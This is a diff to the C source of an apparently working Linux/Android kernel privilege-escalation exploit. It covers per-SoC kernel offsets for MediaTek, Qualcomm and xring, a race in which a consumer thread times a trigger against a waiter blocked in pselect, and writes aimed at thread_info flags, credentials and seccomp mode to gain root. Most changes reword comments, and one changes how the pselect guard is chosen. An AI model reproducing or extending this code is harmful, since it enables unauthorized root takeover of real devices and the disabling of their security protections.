@@ -102,8 +102,8 @@ static enum soc_family detect_soc(void) {
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
-/* Entries carry a phys load address only when measured; otherwise MTK uses
- * the DRAM base, xring its constant, qcom its GKI version. */
+/* A phys load address is honoured only when measured. Otherwise MTK uses the
+ * DRAM base, xring its constant, qcom its GKI version. */
 static void publish_active_offsets(void) {
   g_init_cred_image = INIT_CRED;
   enum soc_family soc = detect_soc();
@@ -227,10 +227,11 @@ atomic_int main_route_delay_usec;
 atomic_llong pselect_started_ns;
 int memfd_leak;
 
-/* The waiter's crafted structure is only valid inside the pselect syscall:
- * firing the trigger before the fd_set copy lands, or after the stack slot is
- * reused, walks fake pointers into freed stack. Reading the waiter's own
- * /proc entry is what tells us which of the three states we are in. */
+/* The waiter's crafted structure is only valid while the thread sits inside
+ * pselect. Firing the trigger before the fd_set copy lands, or after the stack
+ * slot is reused, walks fake pointers into a stack frame that no longer holds
+ * them, which is a panic rather than a missed write. The waiter's own /proc
+ * entry says which state it is in. */
 static int read_task_syscall_nr(int tid) {
   char path[64];
   snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
@@ -259,7 +260,7 @@ static int read_task_wchan(int tid, char *buf, size_t size) {
   buf[n] = 0;
   char *newline = strchr(buf, '\n');
   if (newline) *newline = 0;
-  /* a kernel that hides the symbol for an unprivileged reader answers "0" */
+  /* a kernel that hides the symbol from an unprivileged reader answers "0" */
   if (buf[0] == '0' && buf[1] == 0) return 0;
   return 1;
 }
@@ -271,7 +272,11 @@ static int task_blocked_in_pselect(int tid, char *wchan, size_t size) {
   return strncmp(wchan, "do_select", strlen("do_select")) == 0;
 }
 
-/* Waits for the waiter to sit inside pselect for a few consecutive reads. */
+/* Waits for the waiter to sit inside pselect for a few consecutive reads. Only
+ * the pselect route needs this, because it arms the consumer while the waiter
+ * is parked inside the syscall. The tcp route arms after getsockopt has
+ * returned and the waiter has left, so the check would always read "not in
+ * pselect" there. */
 static int wait_for_pselect_blocked(int tid, int confirmations,
                                     char *last_wchan, size_t last_wchan_size) {
   uint64_t deadline =
@@ -357,7 +362,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
       int delay_usec = atomic_load(&main_route_delay_usec);
       if (delay_usec > 0) usleep((useconds_t)delay_usec);
       int gate = 1;
-      if (active_offsets && active_offsets->compact_waiter) {
+      const struct route *armed = select_route();
+      if (armed && strcmp(armed->name, "pselect") == 0) {
         char wchan[64] = "<not-read>";
         gate = wait_for_pselect_blocked(
             tid, PSELECT_GUARD_CONFIRMATIONS, wchan, sizeof(wchan));
@@ -367,9 +373,9 @@ void *consumer_thread(void *arg __attribute__((unused))) {
             : (uint64_t)-1;
         pr_info("consumer guard tid=%d gate=%d wchan=%s age_usec=%llu\n",
                 tid, gate, wchan, (unsigned long long)age_usec);
-        /* gate 0 is proof the waiter is not in pselect, so the trigger has
-         * nothing to perturb. -1 means the kernel would not say, which falls
-         * back to the blind timer. The age is logged either way. */
+        /* gate 0 means the waiter is provably not in pselect, so the trigger
+         * has nothing to perturb. gate -1 means the kernel would not say and
+         * the blind timer still runs. */
       }
       if (gate == 0) continue;
       for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
@@ -1138,8 +1144,7 @@ int run_exploit(int argc, char **argv) {
   write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
-  /* every transport has its own measured fit test; a profile none of
-   * them fits has no way to write at all */
+  /* a profile that fits no transport has no way to write at all */
   if (!select_route()) {
     pr_error("no feasible route for %s: update ghostlock-extract stamps\n",
              active_offsets->uname_r);
@@ -1300,9 +1305,9 @@ int run_exploit(int argc, char **argv) {
      * must be zeroed too; do both writes back-to-back with one probe
      * (real finit_module calls trip vendor root guards).
      * the mcast stamp and the tcp payload land word-aligned on the waiter base,
-     * so they stamp *(target) exactly: aim straight at thread_info.flags
-     * (task+0) / seccomp.mode. pselect's fd_set copy starts a word above that
-     * base, so its write needs the comm probe to tell [target] from [target+8]. */
+     * so they stamp *(target) exactly. pselect's fd_set copy starts a word
+     * above that base, so its write needs the comm probe to tell [target] from
+     * [target+8]. */
     if (!process_has_seccomp()) {
       pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
       seccomp_ok = 1;
